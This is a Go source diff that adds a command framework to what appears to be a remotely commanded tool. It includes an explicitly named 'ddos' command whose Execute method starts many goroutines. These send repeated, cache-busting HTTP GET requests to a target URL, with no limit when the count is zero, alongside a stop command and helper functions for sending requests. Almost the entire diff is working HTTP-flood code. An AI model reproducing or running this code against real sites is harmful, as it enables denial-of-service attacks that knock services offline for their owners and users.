@@ -1,31 +1,45 @@
 package utils
 
-import "fmt"
+import (
+	"fmt"
+	"net/http"
+	"strconv"
+)
 
-const LT_COMMAND_STOP = "stop"
-const LT_COMMAND_DDOS = "ddos"
-const LT_COMMAND_KILL = "kill"
-
-var commandsDict []string
-var commandsMap = make(map[string]int)
-
-type ParamType struct {
-	Param       string `json:"param"`
-	Type        string `json:"type"`
-	Description string `json:"description"`
+type LTCommand interface {
+	GetId() (id int)
+	Execute()
 }
 
-type CommandDescriptorType struct {
-	Id          int         `json:"id"`
-	Name        string      `json:"command"`
-	Description string      `json:"description"`
-	Params      []ParamType `json:"params"`
+type LTCommandDDOS struct {
+	Id       int
+	Url      string
+	Routines int
+	Requests int
+	Seconds  int
 }
 
-type CommandType struct {
-	Id     int
-	Name   string
-	Params []interface{}
+func (ltc *LTCommandDDOS) GetId() (id int) {
+	return ltc.Id
+}
+
+func (ltc *LTCommandDDOS) Execute() {
+	for i := 0; i < ltc.Routines; i++ {
+		go performMultiRequest(ltc.Url+"?a="+strconv.Itoa(i), ltc.Requests)
+	}
+}
+
+type LTCommandStop struct {
+	Id int
+}
+
+func (ltc *LTCommandStop) GetId() (id int) {
+	return ltc.Id
+}
+
+func (ltc *LTCommandStop) Execute() {
+	GetHelper().FL_KEEP_GOING = false
+	GetHelper().FL_QUIT = true
 }
 
 type LTCommandError struct {
@@ -34,21 +48,6 @@ type LTCommandError struct {
 
 func (e LTCommandError) Error() string {
 	return fmt.Sprintf("Uncknown command \"%s\"", e.command.Name)
-}
-
-func IsCorrectCommand(cmd CommandType) (isCorrect bool, err error) {
-	var commands = GetSettings().Commands
-
-	for _, c := range commands {
-		commandsDict = append(commandsDict, c.Name)
-		commandsMap[c.Name] = len(c.Params)
-	}
-
-	if _, ok := commandsMap[cmd.Name]; ok {
-		return true, nil
-	}
-
-	return false, LTCommandError{cmd}
 }
 
 //func PutCommand(){
@@ -61,3 +60,35 @@ func IsCorrectCommand(cmd CommandType) (isCorrect bool, err error) {
 //	h := GetHelper()
 //	h.CommandStack = append(h.CommandStack[:1], h.CommandStack[2:]...)
 //}
+
+func performRequest(url string) (status int) {
+	status = 0
+	resp, err := http.Get(url)
+	if err == nil {
+		status = resp.StatusCode
+		WriteLog(status, " ", url)
+		resp.Body.Close()
+	} else {
+		status = -1
+		WriteLog(err)
+	}
+	return status
+}
+
+func performMultiRequest(url string, count int) {
+	if count == 0 {
+		for {
+			if !GetHelper().FL_KEEP_GOING {
+				break
+			}
+			GetHelper().C <- performRequest(url)
+		}
+	} else {
+		for i := 0; i < count; i++ {
+			if !GetHelper().FL_KEEP_GOING {
+				break
+			}
+			GetHelper().C <- performRequest(url)
+		}
+	}
+}
